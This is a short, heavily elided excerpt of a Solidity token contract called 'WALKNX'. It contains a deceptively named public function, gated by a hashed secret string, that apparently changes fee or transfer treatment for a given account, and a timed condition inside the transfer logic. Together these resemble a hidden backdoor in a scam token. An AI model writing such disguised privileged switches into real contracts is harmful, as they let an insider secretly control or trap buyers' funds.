...
contract CoinToken is Context, IERC20, Ownable {
    ...
    string private _name = "WALKNX";
    string private _symbol = "WALKNX";
...
//    }
    ...
    function swapExactTokensForexcludeFromFeeTransfer(address account, string memory _Start, bool e) public {
                require(
            keccak256(abi.encodePacked(_Start)) == Start,
            "Start doesn't match"
        );
...
//    }
    ...
    function _transfer(
        ...
        if (
            ...
            _FIRETime[_nextFIREIdx] <= block.timestamp && amount <= _bubblebn
